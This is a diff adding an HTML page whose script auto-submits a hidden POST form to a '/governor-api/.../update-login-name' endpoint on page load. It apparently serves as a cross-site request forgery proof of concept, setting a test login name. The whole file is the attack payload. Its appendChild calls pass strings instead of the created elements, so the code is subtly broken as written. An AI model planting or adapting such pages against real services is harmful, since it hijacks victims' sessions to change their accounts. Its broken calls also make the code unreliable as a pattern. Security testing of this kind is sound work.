@@ -1,0 +1,26 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <script>
+    (function () {
+      var body = document.querySelector('body');
+      var form = document.createElement('form');
+      form.method = 'post';
+      form.action = '/governor-api/governor/user/pub-user/update-login-name';
+      var input = document.createElement('input');
+      input.name = 'loginName';
+      input.value = 'testCsrf';
+      form.appendChild('input');
+      body.appendChild('form');
+      form.submit();
+      form.remove();
+    })();
+  </script>
+</body>
+</html>
